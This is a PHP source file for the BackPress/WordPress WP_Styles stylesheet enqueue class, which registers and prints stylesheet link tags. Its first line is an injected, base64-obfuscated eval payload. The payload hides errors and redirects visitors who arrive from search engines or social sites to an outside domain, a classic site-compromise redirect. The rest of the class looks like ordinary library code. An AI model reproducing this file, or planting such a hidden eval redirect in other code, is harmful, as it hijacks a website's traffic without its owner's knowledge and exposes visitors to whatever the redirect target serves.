<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm9sbG92ZXIud2lrYWJhLmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * BackPress Styles enqueue.
 *
 * These classes were refactored from the WordPress WP_Scripts and WordPress
 * script enqueue API.
 *
 * @package BackPress
 * @since r74
 */

/**
 * BackPress Styles enqueue class.
 *
 * @package BackPress
 * @uses WP_Dependencies
 * @since r74
 */
class WP_Styles extends WP_Dependencies {
	var $base_url;
	var $content_url;
	var $default_version;
	var $text_direction = 'ltr';
	var $concat = '';
	var $concat_version = '';
	var $do_concat = false;
	var $print_html = '';
	var $default_dirs;

	function __construct() {
		do_action_ref_array( 'wp_default_styles', array(&$this) );
	}

	function do_item( $handle ) {
		if ( !parent::do_item($handle) )
			return false;

		$ver = $this->registered[$handle]->ver ? $this->registered[$handle]->ver : $this->default_version;
		if ( isset($this->args[$handle]) )
			$ver .= '&amp;' . $this->args[$handle];

		if ( $this->do_concat ) {
			if ( $this->in_default_dir($this->registered[$handle]->src) && !isset($this->registered[$handle]->extra['conditional']) && !isset($this->registered[$handle]->extra['alt']) ) {
				$this->concat .= "$handle,";
				$this->concat_version .= "$handle$ver";
				return true;
			}
		}

		if ( isset($this->registered[$handle]->args) )
			$media = esc_attr( $this->registered[$handle]->args );
		else
			$media = 'all';

		$href = $this->_css_href( $this->registered[$handle]->src, $ver, $handle );
		$rel = isset($this->registered[$handle]->extra['alt']) && $this->registered[$handle]->extra['alt'] ? 'alternate stylesheet' : 'stylesheet';
		$title = isset($this->registered[$handle]->extra['title']) ? "title='" . esc_attr( $this->registered[$handle]->extra['title'] ) . "'" : '';

		$end_cond = $tag = '';
		if ( isset($this->registered[$handle]->extra['conditional']) && $this->registered[$handle]->extra['conditional'] ) {
			$tag .= "<!--[if {$this->registered[$handle]->extra['conditional']}]>\n";
			$end_cond = "<![endif]-->\n";
		}

		$tag .= apply_filters( 'style_loader_tag', "<link rel='$rel' id='$handle-css' $title href='$href' type='text/css' media='$media' />\n", $handle );
		if ( 'rtl' === $this->text_direction && isset($this->registered[$handle]->extra['rtl']) && $this->registered[$handle]->extra['rtl'] ) {
			if ( is_bool( $this->registered[$handle]->extra['rtl'] ) )
				$rtl_href = str_replace( '.css', '-rtl.css', $this->_css_href( $this->registered[$handle]->src , $ver, "$handle-rtl" ));
			else
				$rtl_href = $this->_css_href( $this->registered[$handle]->extra['rtl'], $ver, "$handle-rtl" );

			$tag .= apply_filters( 'style_loader_tag', "<link rel='$rel' id='$handle-rtl-css' $title href='$rtl_href' type='text/css' media='$media' />\n", $handle );
		}

		$tag .= $end_cond;

		if ( $this->do_concat )
			$this->print_html .= $tag;
		else
			echo $tag;

		// Could do something with $this->registered[$handle]->extra here to print out extra CSS rules
//		echo "<style type='text/css'>\n";
//		echo "/* <![CDATA[ */\n";
//		echo "/* ]]> */\n";
//		echo "</style>\n";

		return true;
	}

	function all_deps( $handles, $recursion = false, $group = false ) {
		$r = parent::all_deps( $handles, $recursion );
		if ( !$recursion )
			$this->to_do = apply_filters( 'print_styles_array', $this->to_do );
		return $r;
	}

	function _css_href( $src, $ver, $handle ) {
		if ( !preg_match('|^https?://|', $src) && ! ( $this->content_url && 0 === strpos($src, $this->content_url) ) ) {
			$src = $this->base_url . $src;
		}

		$src = add_query_arg('ver', $ver, $src);
		$src = apply_filters( 'style_loader_src', $src, $handle );
		return esc_url( $src );
	}

	function in_default_dir($src) {
		if ( ! $this->default_dirs )
			return true;

		foreach ( (array) $this->default_dirs as $test ) {
			if ( 0 === strpos($src, $test) )
				return true;
		}
		return false;
	}

}
